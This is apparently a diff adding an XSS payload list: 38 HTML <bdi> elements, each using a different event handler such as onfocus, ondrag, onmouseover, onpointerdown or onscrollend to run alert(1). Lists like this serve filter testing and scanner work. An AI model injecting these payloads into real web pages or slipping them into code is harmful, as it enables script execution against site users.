@@ -1,0 +1,38 @@
+<bdi contenteditable onbeforeinput=alert(1)>test
+<bdi draggable="true" ondrag="alert(1)" style=display:block>test</bdi>
+<bdi draggable="true" ondragend="alert(1)" style=display:block>test</bdi>
+<bdi draggable="true" ondragenter="alert(1)" style=display:block>test</bdi>
+<bdi draggable="true" ondragleave="alert(1)" style=display:block>test</bdi>
+<bdi draggable="true" ondragstart="alert(1)" style=display:block>test</bdi>
+<bdi id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></bdi>
+<bdi id=x tabindex=1 onfocus=alert(1)></bdi>
+<bdi id=x tabindex=1 onfocusin=alert(1)></bdi>
+<bdi onafterscriptexecute=alert(1)><script>1</script>
+<bdi onbeforescriptexecute=alert(1)><script>1</script>
+<bdi onblur=alert(1) id=x tabindex=1 style=display:block>test</bdi><input value=clickme>
+<bdi onclick="alert(1)" style=display:block>test</bdi>
+<bdi oncontextmenu="alert(1)" style=display:block>test</bdi>
+<bdi oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
+<bdi oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
+<bdi ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</bdi>
+<bdi onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</bdi><input value=clickme>
+<bdi onkeydown="alert(1)" contenteditable style=display:block>test</bdi>
+<bdi onkeypress="alert(1)" contenteditable style=display:block>test</bdi>
+<bdi onkeyup="alert(1)" contenteditable style=display:block>test</bdi>
+<bdi onmousedown="alert(1)" style=display:block>test</bdi>
+<bdi onmouseenter="alert(1)" style=display:block>test</bdi>
+<bdi onmouseleave="alert(1)" style=display:block>test</bdi>
+<bdi onmousemove="alert(1)" style=display:block>test</bdi>
+<bdi onmouseout="alert(1)" style=display:block>test</bdi>
+<bdi onmouseover="alert(1)" style=display:block>test</bdi>
+<bdi onmouseup="alert(1)" style=display:block>test</bdi>
+<bdi onmousewheel=alert(1) style=display:block>requires scrolling
+<bdi onpointerdown=alert(1) style=display:block>XSS</bdi>
+<bdi onpointerenter=alert(1) style=display:block>XSS</bdi>
+<bdi onpointerleave=alert(1) style=display:block>XSS</bdi>
+<bdi onpointermove=alert(1) style=display:block>XSS</bdi>
+<bdi onpointerout=alert(1) style=display:block>XSS</bdi>
+<bdi onpointerover=alert(1) style=display:block>XSS</bdi>
+<bdi onpointerrawupdate=alert(1) style=display:block>XSS</bdi>
+<bdi onpointerup=alert(1) style=display:block>XSS</bdi>
+<bdi onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></bdi>
